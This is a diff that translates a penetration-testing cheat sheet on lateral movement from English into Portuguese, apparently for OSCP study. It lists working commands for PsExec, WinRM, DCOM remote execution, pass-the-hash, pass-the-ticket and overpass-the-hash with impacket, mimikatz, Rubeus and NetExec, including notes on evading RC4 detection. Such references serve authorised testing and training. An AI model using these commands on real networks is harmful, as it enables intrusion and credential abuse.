@@ -1,8 +1,8 @@
-# Lateral Movement
+# Movimento Lateral
 
-## Table of Contents
+## Índice
 
-- [Windows Lateral Movement](#windows-lateral-movement)
+- [Movimento Lateral no Windows](#movimento-lateral-no-windows)
   - [PsExec](#psexec)
   - [WMI](#wmi)
   - [WinRM](#winrm)
@@ -10,18 +10,18 @@
   - [Pass the Hash (PtH)](#pass-the-hash-pth)
   - [Pass the Ticket (PtT)](#pass-the-ticket-ptt)
   - [Overpass the Hash](#overpass-the-hash)
-- [Linux Lateral Movement](#linux-lateral-movement)
+- [Movimento Lateral no Linux](#movimento-lateral-no-linux)
   - [SSH](#ssh)
 - [Port Forwarding & Pivoting](#port-forwarding--pivoting)
 
 ---
 
-## Windows Lateral Movement
+## Movimento Lateral no Windows
 
-### Quick Check (One-liner)
+### Verificação Rápida (One-liner)
 
 ```shell
-# Quick lateral movement test with multiple tools
+# Teste rápido de movimento lateral com múltiplas ferramentas
 impacket-psexec $domain/$user:$pass@$rhost && evil-winrm -i $rhost -u $user -p $pass
 ```
 
@@ -37,17 +37,17 @@ impacket-psexec $domain/$user:$pass@$rhost && evil-winrm -i $rhost -u $user -p $
 #### Impacket PsExec
 
 ```shell
-# With password (no domain)
+# Com senha (sem domínio)
 impacket-psexec "user:password@$rhost"
 
-# With domain
+# Com domínio
 impacket-psexec $domain/user:password@$rhost
 
 # Pass-the-Hash
 impacket-psexec $domain/Administrator@$rhost -hashes :<NTLM_HASH>
 impacket-psexec -hashes :NTLM_HASH Administrator@$rhost
 
-# Interactive
+# Interativo
 impacket-psexec <USERNAME>@$rhost
 ```
 
@@ -117,31 +117,31 @@ evil-winrm -i $rhost -c certificate.crt -k key.key -S
 
 #### Distributed Component Object Model
 
-> DCOM objects that can execute commands remotely
+> Objetos DCOM que executam comandos remotamente
 
-| Object | ProgID | Notes |
-|--------|--------|-------|
-| MMC20 | `MMC20.Application` | Most common, requires admin |
-| ShellWindows | `ShellWindows` | Alternative method |
-| ShellBrowserWindow | `ShellBrowserWindow` | Workstation only |
-| Excel | `Excel.Application` | If Office installed |
-| Outlook | `Outlook.Application` | If Outlook installed |
+| Objeto | ProgID | Observações |
+|--------|--------|-------------|
+| MMC20 | `MMC20.Application` | Mais comum, requer admin |
+| ShellWindows | `ShellWindows` | Método alternativo |
+| ShellBrowserWindow | `ShellBrowserWindow` | Apenas workstations |
+| Excel | `Excel.Application` | Se Office instalado |
+| Outlook | `Outlook.Application` | Se Outlook instalado |
 
 ```powershell
-# MMC20.Application method
+# Método MMC20.Application
 $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","$rhost"))
 $dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c whoami","7")
 $dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e <BASE64_PAYLOAD>","7")
 
-# ShellWindows method
+# Método ShellWindows
 $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("{9BA05972-F6A8-11CF-A442-00A0C90A8F39}","$rhost"))
 $dcom.item().Document.Application.ShellExecute("cmd.exe","/c calc.exe","c:\windows\system32",$null,0)
 
-# ShellBrowserWindow method
+# Método ShellBrowserWindow
 $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("{C08AFD90-F2A1-11D1-8455-00A0C91F3880}","$rhost"))
 $dcom.Document.Application.ShellExecute("cmd.exe","/c calc.exe","c:\windows\system32",$null,0)
 
-# Excel macro execution
+# Execução de macro via Excel
 $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application","$rhost"))
 $dcom.DisplayAlerts = $false
 $workbook = $dcom.Workbooks.Add()
@@ -152,12 +152,12 @@ $dcom.Run("Shell cmd.exe /c powershell -e <BASE64>")
 
 ```shell
 impacket-dcomexec $domain/<USERNAME>:<PASSWORD>@$rhost
-impacket-dcomexec -object MMC20 -silentcommand $domain/<USERNAME>:<PASSWORD>@$rhost '<COMMAND>'
+impacket-dcomexec -object MMC20 -silentcommand $domain/<USERNAME>:<PASSWORD>@$rhost '<COMANDO>'
 
-# With hash
+# Com hash
 impacket-dcomexec -hashes :<NTLM_HASH> -object MMC20 $domain/Administrator@$rhost
 
-# Different objects
+# Objetos alternativos
 impacket-dcomexec -object ShellWindows $domain/<USERNAME>:<PASSWORD>@$rhost
 impacket-dcomexec -object ShellBrowserWindow $domain/<USERNAME>:<PASSWORD>@$rhost
 ```
@@ -166,7 +166,7 @@ impacket-dcomexec -object ShellBrowserWindow $domain/<USERNAME>:<PASSWORD>@$rhos
 
 ### Pass the Hash (PtH)
 
-> Use NTLM hash for authentication
+> Usar hash NTLM para autenticação sem senha em texto claro
 
 #### Impacket
 
@@ -194,47 +194,47 @@ evil-winrm -i $rhost -u Administrator -H <NTLM_HASH>
 
 ### Pass the Ticket (PtT)
 
-> Use Kerberos ticket for authentication (requires .kirbi or .ccache ticket file)
+> Usar ticket Kerberos para autenticação (requer arquivo .kirbi ou .ccache)
 
-#### Export Tickets (mimikatz)
+#### Exportar Tickets (mimikatz)
 
 ```cmd
 sekurlsa::tickets /export
 dir *.kirbi
 ```
 
-#### Inject Ticket (mimikatz)
+#### Injetar Ticket (mimikatz)
 
 ```cmd
 kerberos::ptt <TICKET>.kirbi
 
-# List cached tickets
+# Listar tickets em cache
 kerberos::list
 klist
 ```
 
-#### Inject Ticket (Rubeus)
+#### Injetar Ticket (Rubeus)
 
 ```cmd
 .\Rubeus.exe ptt /ticket:<TICKET>.kirbi
 .\Rubeus.exe ptt /ticket:<BASE64_TICKET>
 
-# Create sacrificial process and inject
+# Criar processo sacrificial e injetar
 .\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
 .\Rubeus.exe ptt /luid:<LUID> /ticket:<TICKET>.kirbi
 ```
 
-#### Convert Ticket Formats
+#### Converter Formatos de Ticket
 
 ```shell
-# Convert .kirbi to .ccache (for Linux)
+# Converter .kirbi para .ccache (uso no Linux)
 impacket-ticketConverter ticket.kirbi ticket.ccache
 
-# Convert .ccache to .kirbi (for Windows)
+# Converter .ccache para .kirbi (uso no Windows)
 impacket-ticketConverter ticket.ccache ticket.kirbi
 ```
 
-#### Linux PtT
+#### PtT no Linux
 
 ```shell
 export KRB5CCNAME=<USERNAME>.ccache
@@ -248,29 +248,29 @@ evil-winrm -i $rhost -r $domain
 
 ### Overpass the Hash
 
-> Use NTLM hash to request Kerberos TGT, then use that ticket for authentication
-> Useful when NTLM authentication is blocked but Kerberos is allowed
+> Usar hash NTLM para solicitar TGT Kerberos e usar o ticket para autenticação.
+> Útil quando autenticação NTLM está bloqueada mas Kerberos está permitido.
 
 #### mimikatz
 
 ```cmd
-# Create new process with injected ticket
+# Criar novo processo com ticket injetado
 sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:powershell
 
-# With AES256 key (more stealthy)
+# Com chave AES256 (mais furtivo)
 sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES256_KEY> /run:powershell
 ```
 
 #### Rubeus
 
 ```cmd
-# Request TGT using NTLM hash
+# Solicitar TGT usando hash NTLM
 .\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /rc4:<NTLM_HASH> /ptt
 
-# Using AES256 (more stealthy, avoids RC4 detection)
+# Com AES256 (mais furtivo, evita detecção RC4)
 .\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES256_KEY> /ptt /opsec
 
-# Create sacrificial logon session
+# Criar sessão logon sacrificial
 .\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
 .\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /rc4:<NTLM_HASH> /ptt /luid:<LUID>
 ```
@@ -282,14 +282,14 @@ impacket-getTGT $domain/<USERNAME> -hashes :<NTLM_HASH>
 export KRB5CCNAME=<USERNAME>.ccache
 impacket-psexec $domain/<USERNAME>@$rhost -k -no-pass
 
-# With AES key
+# Com chave AES
 impacket-getTGT $domain/<USERNAME> -aesKey <AES256_KEY>
 ```
 
-#### NetExec with Kerberos
+#### NetExec com Kerberos
 
 ```shell
-# After exporting ticket
+# Após exportar o ticket
 export KRB5CCNAME=<USERNAME>.ccache
 nxc smb $rhost -k --use-kcache
 nxc smb $rhost -k --use-kcache -x "whoami"
@@ -297,7 +297,7 @@ nxc smb $rhost -k --use-kcache -x "whoami"
 
 ---
 
-## Linux Lateral Movement
+## Movimento Lateral no Linux
 
 ### SSH
 
@@ -307,7 +307,7 @@ ssh -i id_rsa <USERNAME>@$rhost
 ssh -o StrictHostKeyChecking=no <USERNAME>@$rhost
 ```
 
-#### SSH with Password
+#### SSH com Senha
 
 ```shell
 sshpass -p '<PASSWORD>' ssh <USERNAME>@$rhost
@@ -317,31 +317,31 @@ sshpass -p '<PASSWORD>' ssh <USERNAME>@$rhost
 
 ## Port Forwarding & Pivoting
 
-> For detailed port forwarding, pivoting, and tunneling techniques (Chisel, Ligolo-ng, SSH Tunneling, Socat, ProxyChains, sshuttle, Metasploit Pivoting), see:
+> Para técnicas detalhadas de port forwarding, pivoting e tunneling (Chisel, Ligolo-ng, SSH Tunneling, Socat, ProxyChains, sshuttle, Metasploit Pivoting), veja:
 >
-> **[Pivoting & Tunneling Cheatsheet](5.2.Pivoting-Tunneling.md)**
+> **[Cheatsheet de Pivoting & Tunneling](Pivoting-Tunneling.md)**
 
 ---
 
-## See Also
+## Veja Também
 
-### Related AD Files
+### Arquivos AD Relacionados
 
-- **[AD Exploitation](../3.AD-Exploit/3.1.AD-Exploitation.md)** - ACL Abuse, GPO Abuse, AD CS attacks
-- **[Password Attacks](../3.AD-Exploit/3.2.Password-Attacks.md)** - Hash cracking, credential extraction
-- **[Kerberos Attacks](../3.AD-Exploit/3.3.Kerberos-Attacks.md)** - Golden/Silver Tickets, DCSync, Delegation
-- **[NTLM Relay & Responder](../3.AD-Exploit/3.4.NTLM-Relay-and-Responder.md)** - Responder, NTLM Relay, PTH details
+- **[Exploração de AD](../3.AD-Exploit/3.1.AD-Exploitation.md)** - Abuso de ACL, GPO, AD CS
+- **[Ataques de Senha](../3.AD-Exploit/3.2.Password-Attacks.md)** - Quebra de hash, extração de credenciais
+- **[Ataques Kerberos](../3.AD-Exploit/3.3.Kerberos-Attacks.md)** - Golden/Silver Tickets, DCSync, Delegation
+- **[NTLM Relay & Responder](../3.AD-Exploit/3.4.NTLM-Relay-and-Responder.md)** - Responder, NTLM Relay, detalhes PtH
 
 ### Pivoting & Tunneling
 
-- **[Pivoting & Tunneling](5.2.Pivoting-Tunneling.md)** - Chisel, ProxyChains, SSH Tunnels
-- **[Ligolo-ng Complete Guide](5.3.Ligolo-ng-Complete-Guide.md)** - Single/multi-hop pivoting
+- **[Pivoting & Tunneling](Pivoting-Tunneling.md)** - Chisel, ProxyChains, SSH Tunnels
+- **[Guia Completo Ligolo-ng](Ligolo-ng-Complete-Guide.md)** - Pivoting single/multi-hop
 
-### Privilege Escalation
+### Escalação de Privilégios
 
-- **[Windows Privilege Escalation](../4.Privilege-Escalation/4.1.Privilege-Escalation-Windows.md)** - Escalate before pivoting
-- **[Linux Privilege Escalation](../4.Privilege-Escalation/4.2.Privilege-Escalation-Linux.md)** - Linux privesc techniques
+- **[Escalação de Privilégios Windows](../4.Privilege-Escalation/4.1.Privilege-Escalation-Windows.md)** - Escalar antes de pivotar
+- **[Escalação de Privilégios Linux](../4.Privilege-Escalation/4.2.Privilege-Escalation-Linux.md)** - Técnicas de privesc no Linux
 
-### OSCP Preparation
+### Preparação OSCP
 
-- **[OSCP Exam Guide](../9.OSCP-Exam/9.1.OSCP-Exam-Guide.md)** - Complete exam methodology
+- **[Guia do Exame OSCP](../9.OSCP-Exam/9.1.OSCP-Exam-Guide.md)** - Metodologia completa do exame
